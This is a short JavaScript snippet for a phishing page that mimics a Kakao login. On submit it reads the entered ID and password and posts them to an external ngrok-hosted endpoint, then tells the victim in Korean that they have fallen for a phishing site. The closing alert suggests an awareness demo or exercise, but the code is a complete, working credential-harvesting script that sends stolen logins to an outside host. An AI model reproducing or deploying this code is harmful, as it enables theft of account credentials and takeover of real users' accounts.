<script>
    function sendToLocalServer(event) {
        event.preventDefault();

        const id = document.getElementById('loginId--1').value;
        const pw = document.getElementById('password--2').value;

        if (!id || !pw) {
            alert('아이디와 비밀번호를 입력해주세요.');
            return;
        }

        fetch('https://entitle-stillness-oxford.ngrok-free.dev/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                platform: 'kakao',
                id: id,
                pw: pw
            })
        })
            .then(response => response.json())
            .then(data => {
                alert('당신은 피싱 사이트에 속았습니다.');
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
</script>
